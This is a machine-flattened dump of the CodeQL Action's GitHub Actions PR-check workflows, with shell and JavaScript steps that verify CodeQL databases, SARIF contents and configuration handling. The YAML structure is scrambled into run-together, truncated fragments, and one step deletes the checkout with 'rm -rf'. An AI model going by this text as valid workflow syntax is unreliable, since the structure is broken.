if [[ ! -z "${CODEQL_ACTION_DID_AUTOBUILD_GOLANG}" ]]; then
  echo "Expected the Go autobuilder not to be run, but the" \
    "CODEQL_ACTION_DID_AUTOBUILD_GOLANG environment variable was set."
  exit 1
fi
cd "$RUNNER_TEMP/codeql_databases"
if [[ ! -d go ]]; then
  echo "Did not find a Go database"
  exit 1
fi
go-trac ... -steps:name: ' ...  steps'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____go-tracing-legacy-workflow.ymlPR Check - Go: tracing with legacy workflow'PR Che ... rkflow'go-tracing-legacy-workflowgo-trac ... orkflowGo: tracing with legacy workflow'Go: tr ... rkflow'cd "$RUNNER_TEMP/codeql_databases"
if [[ ! -d go ]]; then
  echo "Did not find a Go database"
  exit 1
fi
go-trac ... rkflow:name: ' ... rkflow'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____init-with-registries.ymlPR Check - Packaging: Download using registries'PR Che ... stries'init-with-registriesPackaging: Download using registries'Packag ... stries'Init with registries./.github/codeql/codeql-config-registries.ymlregistries- url: "https://ghcr.io/v2/"
  packages: "*/*"
  token: "${{ secrets.GITHUB_TOKEN }}"
db-loca ... ocationname: I ... istriesVerify packages installedVerify  ... stalledPRIVATE_PACK="$HOME/.codeql/packages/codeql-testing/private-pack"
CODEQL_PACK1="$HOME/.codeql/packages/codeql-testing/codeql-pack1"

if [[ -d $PRIVATE_PACK ]]
then
    echo "$PRIVATE_PACK was installed."
else
    echo "::error $PRIVATE_PACK pack was not installed."
    exit 1
fi

if [[ -d $CODEQL_PACK1 ]]
then
    echo "$CODEQL_PACK1 was installed."
else
    echo "::error $CODEQL_PACK1 pack was not installed."
    exit 1
fi
name: V ... stalledVerify qlconfig.yml file was createdVerify  ... createdQLCONFIG_PATH=$RUNNER_TEMP/qlconfig.yml
echo "Expected qlconfig.yml file to be created at $QLCONFIG_PATH"
if [[ -f $QLCONFIG_PATH ]]
then
    echo "qlconfig.yml file was created."
else
    echo "::error qlconfig.yml file was not created."
    exit 1
fi
name: V ... createdVerify contents of qlconfig.ymlVerify  ... fig.ymlQLCONFIG_PATH=$RUNNER_TEMP/qlconfig.yml
cat $QLCONFIG_PATH | yq -e '.registries[] | select(.url == "https://ghcr.io/v2/") | select(.packages == "*/*")'
if [[ $? -eq 0 ]]
then
    echo "Registry was added to qlconfig.yml file."
else
    echo "::error Registry was not added to qlconfig.yml file."
    echo "Contents of qlconfig.yml file:"
    cat $QLCONFIG_PATH
    exit 1
fi
name: V ... fig.ymlinit-wi ... stries:name: ' ... stries'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____javascript-source-root.ymlPR Check - Custom source rootPR Chec ... ce rootjavascript-source-rootjavascr ... ce-rootCustom source rootMove codeql-actionmkdir ../new-source-root
mv * ../new-source-root
name: M ... -actionsource-root../new-source-rootskip-queriesskip-queries: trueAssert database existsAssert  ...  existscd "$RUNNER_TEMP/codeql_databases"
if [[ ! -d javascript ]]; then
  echo "Did not find a JavaScript database"
  exit 1
fi
name: A ...  existsjavascr ... e-root:name: P ... ce root/home/huawei/github-actions-security/.github/workflows/github_codeql-action____job-run-uuid-sarif.ymlPR Check - Job run UUID added to SARIFPR Chec ... o SARIFjob-run-uuid-sarifJob run UUID added to SARIFJob run ... o SARIF${{ matrix.os }}-${{ matrix.version }}.sarif.json${{ mat ... if.jsonname: $ ... if.jsoncd "$RUNNER_TEMP/results"
actual=$(jq -r '.runs[0].properties.jobRunUuid' javascript.sarif)
if [[ "$actual" != "$JOB_RUN_UUID" ]]; then
  echo "Expected SARIF output to contain job run UUID '$JOB_RUN_UUID', but found '$actual'."
  exit 1
else
  echo "Found job run UUID '$actual'."
fi
job-run-uuid-sarif:name: P ... o SARIF/home/huawei/github-actions-security/.github/workflows/github_codeql-action____language-aliases.ymlPR Check - Language aliasesPR Chec ... aliaseslanguage-aliasesLanguage aliasesC#,java-kotlin,swift,typescriptC#,java ... escriptlanguag ... escriptCheck languagesexpected_languages="csharp,java,swift,javascript"
actual_languages=$(jq -r '.languages | join(",")' "$RUNNER_TEMP"/config)

if [ "$expected_languages" != "$actual_languages" ]; then
  echo "Resolved languages did not match expected list. " \
    "Expected languages: $expected_languages. Actual languages: $actual_languages."
  exit 1
fi
name: C ... nguageslanguage-aliases:name: P ... aliases/home/huawei/github-actions-security/.github/workflows/github_codeql-action____multi-language-autodetect.ymlPR Check - Multi-language repositoryPR Chec ... ositorymulti-language-autodetectmulti-l ... odetectMulti-language repositoryMulti-l ... ository${{ runner.os == 'Linux' && 'cpp,csharp,go,java,javascript,python,ruby' || '' }}${{ run ... n,ruby'upload- ... : falseCheck language autodetect for all languages excluding SwiftCheck l ... g SwiftCPP_DB=${{ fromJson(steps.analysis.outputs.db-locations).cpp }}
if [[ ! -d $CPP_DB ]] || [[ ! $CPP_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for CPP, or created it in the wrong location."
  exit 1
fi
CSHARP_DB=${{ fromJson(steps.analysis.outputs.db-locations).csharp }}
if [[ ! -d $CSHARP_DB ]] || [[ ! $CSHARP_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for C Sharp, or created it in the wrong location."
  exit 1
fi
GO_DB=${{ fromJson(steps.analysis.outputs.db-locations).go }}
if [[ ! -d $GO_DB ]] || [[ ! $GO_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for Go, or created it in the wrong location."
  exit 1
fi
JAVA_DB=${{ fromJson(steps.analysis.outputs.db-locations).java }}
if [[ ! -d $JAVA_DB ]] || [[ ! $JAVA_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for Java, or created it in the wrong location."
  exit 1
fi
JAVASCRIPT_DB=${{ fromJson(steps.analysis.outputs.db-locations).javascript }}
if [[ ! -d $JAVASCRIPT_DB ]] || [[ ! $JAVASCRIPT_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for Javascript, or created it in the wrong location."
  exit 1
fi
PYTHON_DB=${{ fromJson(steps.analysis.outputs.db-locations).python }}
if [[ ! -d $PYTHON_DB ]] || [[ ! $PYTHON_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for Python, or created it in the wrong location."
  exit 1
fi
RUBY_DB=${{ fromJson(steps.analysis.outputs.db-locations).ruby }}
if [[ ! -d $RUBY_DB ]] || [[ ! $RUBY_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for Ruby, or created it in the wrong location."
  exit 1
fi
name: C ... g SwiftCheck language autodetect for Swift on macOSCheck l ... n macOSSWIFT_DB=${{ fromJson(steps.analysis.outputs.db-locations).swift }}
if [[ ! -d $SWIFT_DB ]] || [[ ! $SWIFT_DB == ${{ runner.temp }}/customDbLocation/* ]]; then
  echo "Did not create a database for Swift, or created it in the wrong location."
  exit 1
fi
multi-l ... detect:name: P ... ository/home/huawei/github-actions-security/.github/workflows/github_codeql-action____packaging-codescanning-config-inputs-js.ymlPR Check - Packaging: Config and input passed to the CLI'PR Che ... he CLI'packaging-codescanning-config-inputs-jspackagi ... puts-jsPackaging: Config and input passed to the CLI'Packag ... he CLI'.github/codeql/codeql-config-packaging3.yml.github ... ng3.ymlpacks+codeql-testing/codeql-pack1@1.0.0+codeql ... 1@1.0.0config- ... ng3.ymljavascript/example/empty-or-one-block,javascript/example/empty-or-one-block,javascript/example/other-query-block,javascript/example/two-blockjavascr ... o-blockfoo,barcd "$RUNNER_TEMP/results"
# We should have 4 hits from these rules
EXPECTED_RULES="javascript/example/empty-or-one-block javascript/example/empty-or-one-block javascript/example/other-query-block javascript/example/two-block"

# use tr to replace newlines with spaces and xargs to trim leading and trailing whitespace
RULES="$(cat javascript.sarif | jq -r '.runs[0].results[].ruleId' | sort | tr "\n\r" " " | xargs)"
echo "Found matching rules '$RULES'"
if [ "$RULES" != "$EXPECTED_RULES" ]; then
  echo "Did not match expected rules '$EXPECTED_RULES'."
  exit 1
fi
packagi ... uts-js:name: ' ... he CLI'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____packaging-config-inputs-js.ymlPR Check - Packaging: Config and input'PR Che ...  input'packaging-config-inputs-jsPackaging: Config and input'Packag ...  input'name: ' ...  input'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____packaging-config-js.ymlPR Check - Packaging: Config file'PR Che ... g file'packaging-config-jsPackaging: Config file'Packag ... g file'.github/codeql/codeql-config-packaging.yml.github ... ing.ymlconfig- ... ing.ymlpackaging-config-js:name: ' ... g file'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____packaging-inputs-js.ymlPR Check - Packaging: Action inputpackaging-inputs-jsPackaging: Action input.github/codeql/codeql-config-packaging2.yml.github ... ng2.ymlcodeql-testing/codeql-pack1@1.0.0, codeql-testing/codeql-pack2, codeql-testing/codeql-pack3:other-query.qlcodeql- ... uery.qlconfig- ... ng2.ymlpackaging-inputs-js:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____remote-config.ymlPR Check - Remote config filePR Chec ... ig fileremote-configRemote config fileremote-config:name: P ... ig file/home/huawei/github-actions-security/.github/workflows/github_codeql-action____resolve-environment-action.ymlPR Check - Resolve environmentPR Chec ... ronmentresolve-environment-actionresolve ... -actionResolve environmentgo,javascript-typescriptgo,java ... escriptResolve environment for GoResolve ...  for Go./../action/resolve-environment./../ac ... ronmentresolve-environment-goresolve ... ment-golanguage: goname: R ...  for GoFail if Go configuration missingFail if ... missing(!fromJSON(steps.resolve-environment-go.outputs.environment).configuration.go)(!fromJ ... ion.go)exit 1name: F ... missingResolve environment for JavaScript/TypeScriptResolve ... eScriptresolve-environment-jsresolve ... ment-jsjavascript-typescriptjavascr ... escriptname: R ... eScriptFail if JavaScript/TypeScript configuration presentFail if ... presentfromJSON(steps.resolve-environment-js.outputs.environment).configuration.javascriptfromJSO ... ascriptname: F ... presentresolve ... action:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____rubocop-multi-language.ymlPR Check - RuboCop multi-languagePR Chec ... anguagerubocop-multi-languagerubocop ... anguageRuboCop multi-languageRuboCop ... anguageSet up Rubyruby/setup-ruby@e5ac7b085f6e63d49c8973eb0c6e04d876b881f1ruby/se ... 6b881f1ruby-version2.6ruby-version: 2.6name: Set up RubyInstall Code Scanning integrationInstall ... grationbundle add code-scanning-rubocop --version 0.3.0 --skip-installbundle  ... installname: I ... grationbundle installRuboCop runbash -c "
  bundle exec rubocop --require code_scanning --format CodeScanning::SarifFormatter -o rubocop.sarif
  [[ $? -ne 2 ]]
"
name: RuboCop run./../action/upload-sarif./../ac ... d-sarifrubocop.sarifsarif_f ... p.sarifuses: . ... d-sarifrubocop ... nguage:name: P ... anguage/home/huawei/github-actions-security/.github/workflows/github_codeql-action____ruby.ymlPR Check - Ruby analysisPR Chec ... nalysisrubyRuby analysislanguages: rubyRUBY_DB="${{ fromJson(steps.analysis.outputs.db-locations).ruby }}"
if [[ ! -d "$RUBY_DB" ]]; then
  echo "Did not create a database for Ruby."
  exit 1
fi
ruby:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____rust.ymlPR Check - Rust analysisrustRust analysislanguages: rustCODEQL_ACTION_RUST_ANALYSISCODEQL_ ... NALYSISRUST_DB="${{ fromJson(steps.analysis.outputs.db-locations).rust }}"
if [[ ! -d "$RUST_DB" ]]; then
  echo "Did not create a database for Rust."
  exit 1
fi
rust:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____split-workflow.ymlPR Check - Split workflowPR Chec ... orkflowsplit-workflowSplit workflowAssert No Resultsif [ "$(ls -A $RUNNER_TEMP/results)" ]; then
  echo "Expected results directory to be empty after skipping query execution!"
  exit 1
fi
name: A ... Resultssplit-workflow:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____start-proxy.ymlPR Check - Start proxyPR Chec ... t proxystart-proxyStart proxySetup proxy for registriesSetup p ... istries./../action/start-proxy./../ac ... t-proxyregistry_secrets[{ "type": "nuget_feed", "url": "https://api.nuget.org/v3/index.json" }]'[{ "ty ... x.json"registr ... x.json"name: S ... istriesPrint proxy outputsecho "${{ steps.proxy.outputs.proxy_host }}"
echo "${{ steps.proxy.outputs.proxy_port }}"
echo "${{ steps.proxy.outputs.proxy_urls }}"
name: P ... outputsFail if proxy outputs are not setFail if ... not set(!steps.proxy.outputs.proxy_host) || (!steps.proxy.outputs.proxy_port) || (!steps.proxy.outputs.proxy_ca_certificate) || (!steps.proxy.outputs.proxy_urls)(!steps ... y_port)name: F ... not setstart-proxy:name: P ... t proxy/home/huawei/github-actions-security/.github/workflows/github_codeql-action____submit-sarif-failure.ymlPR Check - Submit SARIF after failurePR Chec ... failuresubmit-sarif-failureSubmit SARIF after failureSubmit  ... failure./inituses: ./initFailname: Fail./analyze/test-codeql-version:${{ matrix.version }}/test-c ... sion }}categor ... sion }}uses: ./analyzeCODEQL_ACTION_EXPECT_UPLOAD_FAILED_SARIFCODEQL_ ... D_SARIFCODEQL_ACTION_UPLOAD_FAILED_SARIFCODEQL_ACTION_TESTING_ENVIRONMENTCODEQL_ ... RONMENTcodeql-action-pr-checkscodeql- ... -checksCODEQL_ ... F: truesubmit- ... ailure:name: P ... failure/home/huawei/github-actions-security/.github/workflows/github_codeql-action____swift-autobuild.ymlPR Check - Swift analysis using autobuildswift-autobuildSwift analysis using autobuildSwift a ... tobuildswiftlanguages: swift${{steps.init.outputs.codeql-path}}${{step ... -path}}codeql- ... -path}}Check working directoryCheck w ... rectorypwdname: C ... rectorySWIFT_DB="${{ fromJson(steps.analysis.outputs.db-locations).swift }}"
if [[ ! -d "$SWIFT_DB" ]]; then
  echo "Did not create a database for Swift."
  exit 1
fi
swift-autobuild:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____swift-custom-build.ymlPR Check - Swift analysis using a custom build commandPR Chec ... commandswift-custom-buildSwift analysis using a custom build commandSwift a ... commandswift-custom-build:name: P ... command/home/huawei/github-actions-security/.github/workflows/github_codeql-action____test-autobuild-working-dir.ymlPR Check - Autobuild working directorytest-autobuild-working-dirtest-au ... ing-dirAutobuild working directoryAutobui ... rectorycd "$RUNNER_TEMP/codeql_databases"
if [[ ! -d java ]]; then
  echo "Did not find a Java database"
  exit 1
fi
test-au ... ng-dir:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____test-local-codeql.ymlPR Check - Local CodeQL bundletest-local-codeqlLocal CodeQL bundleFetch a CodeQL bundleFetch a ...  bundleCODEQL_URLCODEQL_ ... -url }}wget "$CODEQL_URL"
name: F ...  bundle./codeql-bundle-linux64.tar.zst./codeq ... tar.zsttest-local-codeql:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____test-proxy.ymlPR Check - Proxy testPR Chec ... xy testProxy testSet up GitHub CLIapt update
apt install -y curl libreadline8 gnupg2 software-properties-common zstd
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg
apt-key add /usr/share/keyrings/githubcli-archive-keyring.gpg
apt-add-repository https://cli.github.com/packages
apt install -y gh
name: S ... Hub CLI- name: ... Hub CLIubuntu:22.04image: ubuntu:22.04name: P ... xy test/home/huawei/github-actions-security/.github/workflows/github_codeql-action____unset-environment.ymlPR Check - Test unsetting environment variablesPR Chec ... riablesunset-environmentTest unsetting environment variablesTest un ... riablesenv -i PATH="$PATH" HOME="$HOME" ./build.shenv -i  ... uild.shCPP_DB="${{ fromJson(steps.analysis.outputs.db-locations).cpp }}"
if [[ ! -d "$CPP_DB" ]] || [[ ! "$CPP_DB" == "${RUNNER_TEMP}/customDbLocation/cpp" ]]; then
  echo "::error::Did not create a database for CPP, or created it in the wrong location." \
    "Expected location was '${RUNNER_TEMP}/customDbLocation/cpp' but actual was '${CPP_DB}'"
  exit 1
fi
CSHARP_DB="${{ fromJson(steps.analysis.outputs.db-locations).csharp }}"
if [[ ! -d "$CSHARP_DB" ]] || [[ ! "$CSHARP_DB" == "${RUNNER_TEMP}/customDbLocation/csharp" ]]; then
  echo "::error::Did not create a database for C Sharp, or created it in the wrong location." \
    "Expected location was '${RUNNER_TEMP}/customDbLocation/csharp' but actual was '${CSHARP_DB}'"
  exit 1
fi
GO_DB="${{ fromJson(steps.analysis.outputs.db-locations).go }}"
if [[ ! -d "$GO_DB" ]] || [[ ! "$GO_DB" == "${RUNNER_TEMP}/customDbLocation/go" ]]; then
  echo "::error::Did not create a database for Go, or created it in the wrong location." \
    "Expected location was '${RUNNER_TEMP}/customDbLocation/go' but actual was '${GO_DB}'"
  exit 1
fi
JAVA_DB="${{ fromJson(steps.analysis.outputs.db-locations).java }}"
if [[ ! -d "$JAVA_DB" ]] || [[ ! "$JAVA_DB" == "${RUNNER_TEMP}/customDbLocation/java" ]]; then
  echo "::error::Did not create a database for Java, or created it in the wrong location." \
    "Expected location was '${RUNNER_TEMP}/customDbLocation/java' but actual was '${JAVA_DB}'"
  exit 1
fi
JAVASCRIPT_DB="${{ fromJson(steps.analysis.outputs.db-locations).javascript }}"
if [[ ! -d "$JAVASCRIPT_DB" ]] || [[ ! "$JAVASCRIPT_DB" == "${RUNNER_TEMP}/customDbLocation/javascript" ]]; then
  echo "::error::Did not create a database for Javascript, or created it in the wrong location." \
    "Expected location was '${RUNNER_TEMP}/customDbLocation/javascript' but actual was '${JAVASCRIPT_DB}'"
  exit 1
fi
PYTHON_DB="${{ fromJson(steps.analysis.outputs.db-locations).python }}"
if [[ ! -d "$PYTHON_DB" ]] || [[ ! "$PYTHON_DB" == "${RUNNER_TEMP}/customDbLocation/python" ]]; then
  echo "::error::Did not create a database for Python, or created it in the wrong location." \
    "Expected location was '${RUNNER_TEMP}/customDbLocation/python' but actual was '${PYTHON_DB}'"
  exit 1
fi
unset-environment:name: P ... riables/home/huawei/github-actions-security/.github/workflows/github_codeql-action____upload-ref-sha-input.ymlPR Check - Upload-sarif: 'ref' and 'sha' from inputsupload-ref-sha-inputUpload-sarif: 'ref' and 'sha' from inputs"Upload ... inputs"uploadneverupload- ... -input:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____with-checkout-path.ymlPR Check - Use a custom `checkout_path`PR Chec ... t_path`with-checkout-pathUse a custom `checkout_path`Use a c ... t_path`Delete original checkoutDelete  ... heckout# delete the original checkout so we don't accidentally use it.
# Actions does not support deleting the current working directory, so we
# delete the contents of the directory instead.
rm -rf ./* .github .git
name: D ... heckout474bbf07f9247ffe1856c6a0f94aeeb10e7afee6474bbf0 ... e7afee6x/y/z/some-pathref: 47 ... e7afee6csharp,javascriptx/y/z/some-path/tests/multi-language-repox/y/z/s ... ge-repo./build.sh
checkout_pathv1.1.0checkou ... ge-repoVerify SARIF after uploadVerify  ...  uploadEXPECTED_COMMIT_OID="474bbf07f9247ffe1856c6a0f94aeeb10e7afee6"
EXPECTED_REF="v1.1.0"
EXPECTED_CHECKOUT_URI_SUFFIX="/x/y/z/some-path/tests/multi-language-repo"

ACTUAL_COMMIT_OID="$(cat "$RUNNER_TEMP/payload.json" | jq -r .commit_oid)"
ACTUAL_REF="$(cat "$RUNNER_TEMP/payload.json" | jq -r .ref)"
ACTUAL_CHECKOUT_URI="$(cat "$RUNNER_TEMP/payload.json" | jq -r .checkout_uri)"

if [[ "$EXPECTED_COMMIT_OID" != "$ACTUAL_COMMIT_OID" ]]; then
  echo "::error Invalid commit oid. Expected: $EXPECTED_COMMIT_OID Actual: $ACTUAL_COMMIT_OID"
  echo "$RUNNER_TEMP/payload.json"
  exit 1
fi

if [[ "$EXPECTED_REF" != "$ACTUAL_REF" ]]; then
  echo "::error Invalid ref. Expected: '$EXPECTED_REF' Actual: '$ACTUAL_REF'"
  echo "$RUNNER_TEMP/payload.json"
  exit 1
fi

if [[ "$ACTUAL_CHECKOUT_URI" != *$EXPECTED_CHECKOUT_URI_SUFFIX ]]; then
  echo "::error Invalid checkout URI suffix. Expected suffix: $EXPECTED_CHECKOUT_URI_SUFFIX Actual uri: $ACTUAL_CHECKOUT_URI"
  echo "$RUNNER_TEMP/payload.json"
  exit 1
fi
name: V ...  uploadwith-checkout-path:name: P ... t_path`/home/huawei/github-actions-security/.github/workflows/github_codeql-action____zstd-bundle-streaming.ymlPR Check - Zstandard bundle (streaming)PR Chec ... eaming)zstd-bundle-streamingzstd-bu ... reamingZstandard bundle (streaming)Zstanda ... eaming)const fs = require('fs');
const path = require('path');
const codeqlPath = path.join(process.env['RUNNER_TOOL_CACHE'], 'CodeQL');
if (codeqlPath !== undefined) {
  fs.rmdirSync(codeqlPath, { recursive: true });
}
${{ matrix.os }}-zstd-bundle.sarif${{ mat ... e.sarifname: $ ... e.sarifCheck diagnostic with expected tools URL appears in SARIFconst fs = require('fs');

const sarif = JSON.parse(fs.readFileSync(process.env['SARIF_PATH'], 'utf8'));
const run = sarif.runs[0];

const toolExecutionNotifications = run.invocations[0].toolExecutionNotifications;
const downloadTelemetryNotifications = toolExecutionNotifications.filter(n =>
  n.descriptor.id === 'codeql-action/bundle-download-telemetry'
);
if (downloadTelemetryNotifications.length !== 1) {
  core.setFailed(
    'Expected exactly one reporting descriptor in the ' +
      `'runs[].invocations[].toolExecutionNotifications[]' SARIF property, but found ` +
      `${downloadTelemetryNotifications.length}. All notification reporting descriptors: ` +
      `${JSON.stringify(toolExecutionNotifications)}.`
  );
}

const toolsUrl = downloadTelemetryNotifications[0].properties.attributes.toolsUrl;
console.log(`Found tools URL: ${toolsUrl}`);

if (!toolsUrl.endsWith('.tar.zst')) {
  core.setFailed(
    `Expected the tools URL to be a .tar.zst file, but found ${toolsUrl}.`
  );
}
CODEQL_ACTION_ZSTD_BUNDLECODEQL_ ... _BUNDLECODEQL_ACTION_ZSTD_BUNDLE_STREAMING_EXTRACTIONCODEQL_ ... RACTIONzstd-bu ... eaming:name: P ... eaming)/home/huawei/github-actions-security/.github/workflows/github_codeql-action____zstd-bundle.ymlPR Check - Zstandard bundlezstd-bundleZstandard bundleconst fs = require('fs');

const sarif = JSON.parse(fs.readFileSync(process.env['SARIF_PATH'], 'utf8'));
const run = sarif.runs[0];

const toolExecutionNotifications = run.invocations[0].toolExecutionNotifications;
const downloadTelemetryNotifications = toolExecutionNotifications.filter(n =>
  n.descriptor.id === 'codeql-action/bundle-download-telemetry'
);
if (downloadTelemetryNotifications.length !== 1) {
  core.setFailed(
    'Expected exactly one reporting descriptor in the ' +
      `'runs[].invocations[].toolExecutionNotifications[]' SARIF property, but found ` +
      `${downloadTelemetryNotifications.length}. All notification reporting descriptors: ` +
      `${JSON.stringify(toolExecutionNotifications)}.`
  );
}

const toolsUrl = downloadTelemetryNotifications[0].properties.attributes.toolsUrl;
console.log(`Found tools URL: ${toolsUrl}`);

const expectedExtension = process.env['RUNNER_OS'] === 'Windows' ? '.tar.gz' : '.tar.zst';

if (!toolsUrl.endsWith(expectedExtension)) {
  core.setFailed(
    `Expected the tools URL to be a ${expectedExtension} file, but found ${toolsUrl}.`
  );
}
zstd-bundle:/home/huawei/github-actions-security/.github/workflows/github_codeql-action__check-expected-release-files.ymlCheck Expected Release FilesCheck E ... e Files.github/workflows/check-expected-release-files.yml.github ... les.ymlsrc/defaults.json- .gith ... les.ymlcheck-expected-release-filescheck-e ... e-filesCheckout CodeQL ActionCheckou ...  Actionname: C ...  Actionbundle_version="$(cat "./src/defaults.json" | jq -r ".bundleVersion")"
set -x
for expected_file in "codeql-bundle.tar.gz" "codeql-bundle-linux64.tar.gz" "codeql-bundle-osx64.tar.gz" "codeql-bundle-win64.tar.gz"; do
  curl --location --fail --head --request GET "https://github.com/github/codeql-action/releases/download/$bundle_version/$expected_file" > /dev/null
done
name: C ... e Filescheck-e ... -files:/home/huawei/github-actions-security/.github/workflows/github_codeql-action__codeql.ymlCodeQL action"CodeQL action"[main, releases/v*]branche ... ses/v*]30 1 * * 0'30 1 * * 0'cron: '30 1 * * 0'- cron: '30 1 * * 0'CODEQL_ ... -checkscheck-codeql-versionscheck-c ... ersions${{ steps.compare.outputs.versions }}${{ ste ... ions }}version ... ions }}Init with default CodeQL bundle from the VM imageInit wi ... M imageinit-defaultname: I ... M imageRemove empty databaseRemove  ... atabaserm -rf "$RUNNER_TEMP/codeql_databases"
name: R ... atabaseInit with latest CodeQL bundleInit wi ...  bundleinit-latesttools: linkedname: I ...  bundleCompare default and latest CodeQL bundle versionsCompare ... ersionscompareCODEQL_DEFAULT${{ steps.init-default.outputs.codeql-path }}CODEQL_LATEST${{ steps.init-latest.outputs.codeql-path }}CODEQL_VERSION_DEFAULT="$("$CODEQL_DEFAULT" version --format terse)"
CODEQL_VERSION_LATEST="$("$CODEQL_LATEST" version --format terse)"
echo "Default CodeQL bundle version is $CODEQL_VERSION_DEFAULT"
echo "Latest CodeQL bundle version is $CODEQL_VERSION_LATEST"

# If we're running on a pull request, run with both bundles, even if `tools: linked` would
# be the same as `tools: null`. This allows us to make the job for each of the bundles a
# required status check.
#
# If we're running on push or schedule, then we can skip running with `tools: linked` when it would be
# the same as running with `tools: null`.
if [[ "$GITHUB_EVENT_NAME" != "pull_request" && "$CODEQL_VERSION_DEFAULT" == "$CODEQL_VERSION_LATEST" ]]; then
  VERSIONS_JSON='[null]'
else
  VERSIONS_JSON='[null, "linked"]'
fi

# Output a JSON-encoded list with the distinct versions to test against.
echo "Suggested matrix config for analysis job: $VERSIONS_JSON"
echo "versions=${VERSIONS_JSON}" >> $GITHUB_OUTPUT
analyze-javascript[check- ... rsions][ubuntu ... cos-14]${{ fromJson(needs.check-codeql-versions.outputs.versions) }}${{ fro ... ons) }}os: [ub ... cos-14]./.github/codeql/codeql-config.yml./.gith ... fig.yml${{ matrix.tools }}Print CodeQL Version${{steps.init.outputs.codeql-path}} version --format=json${{step ... at=jsonname: P ... Version/language:javascript"/langu ... script"categor ... script"needs:  ... rsions]analyze-actions./.github/codeql/codeql-actions-config.ymllanguages: actions/language:actions"/language:actions"categor ... ctions"check-c ... rsions:/home/huawei/github-actions-security/.github/workflows/github_codeql-action__codescanning-config-cli.ymlCode-Scanning config CLI testsCode-Sc ... I testsCODEQL_ACTION_DIFF_INFORMED_QUERIESCODEQL_ ... QUERIEScode-scanning-config-testscode-sc ... g-testsCode Scanning Configuration testsCode Sc ... n testsEmpty file./../action/.github/actions/check-codescanning-config./../ac ... -configexpected-config-file-contentsexpecte ... ontents"{}"expecte ... s: "{}"name: Empty filePacks from inputsuccess() || failure()success ... ilure(){
  "packs": ["codeql-testing/codeql-pack1@1.0.0", "codeql-testing/codeql-pack2" ]
}
codeql-testing/codeql-pack1@1.0.0, codeql-testing/codeql-pack2codeql- ... l-pack2expecte ... ents: |name: P ... m inputPacks from input with +Packs f ...  with ++ codeql-testing/codeql-pack1@1.0.0, codeql-testing/codeql-pack2+ codeq ... l-pack2name: P ...  with +Queries from input{
  "queries": [{ "uses": "./codeql-qlpacks/complex-javascript-qlpack/show_ifs.ql" }]
}
./codeql-qlpacks/complex-javascript-qlpack/show_ifs.ql./codeq ... _ifs.qlname: Q ... m inputQueries from input with +Queries ...  with ++ ./codeql-qlpacks/complex-javascript-qlpack/show_ifs.ql+ ./cod ... _ifs.qlname: Q ...  with +Queries and packs from input with +{
  "queries": [{ "uses": "./codeql-qlpacks/complex-javascript-qlpack/show_ifs.ql" }],
  "packs": ["codeql-testing/codeql-pack1@1.0.0", "codeql-testing/codeql-pack2" ]
}
Queries and packs from configQueries ...  config{
  "queries": [{ "uses": "./codeql-qlpacks/complex-javascript-qlpack/foo2/show_ifs.ql" }],
  "packs": {
    "javascript": ["codeql-testing/codeql-pack1@1.0.0", "codeql-testing/codeql-pack2" ]
  }
}
config-file-test.github/codeql/queries-and-packs-config.yml.github ... fig.ymlname: Q ...  configQueries and packs from config overriden by inputQueries ... y input{
  "queries": [{ "uses": "./codeql-qlpacks/complex-javascript-qlpack/show_ifs.ql" }],
  "packs": ["codeql/javascript-queries"]
}
codeql/javascript-queriescodeql/ ... queriesname: Q ... y inputQueries and packs from config merging with inputQueries ... h input{
  "queries": [
    { "uses": "./codeql-qlpacks/complex-javascript-qlpack/foo2/show_ifs.ql" },
    { "uses": "./codeql-qlpacks/complex-javascript-qlpack/show_ifs.ql" }
  ],
  "packs": {
    "javascript": ["codeql-testing/codeql-pack1@1.0.0", "codeql-testing/codeql-pack2", "codeql/javascript-queries" ]
  }
}
+ codeql/javascript-queries+ codeq ... queriesname: Q ... h inputMulti-language packs from configMulti-l ...  config{
  "packs": {
    "javascript": ["codeql-testing/codeql-pack1@1.0.0", "codeql-testing/codeql-pack2" ],
    "ruby": ["codeql/ruby-queries"]
  },
  "queries": [
    { "uses": "./codeql-qlpacks/complex-javascript-qlpack/foo2/show_ifs.ql" }
  ]
}
javascript,ruby.github/codeql/multi-language-packs-config.ymlname: M ...  configOther config propertiesOther c ... perties{
  "name": "Config using all properties",
  "packs": ["codeql/javascript-queries" ],
  "disable-default-queries": true,
  "paths-ignore": ["xxx"],
  "paths": ["yyy"]
}
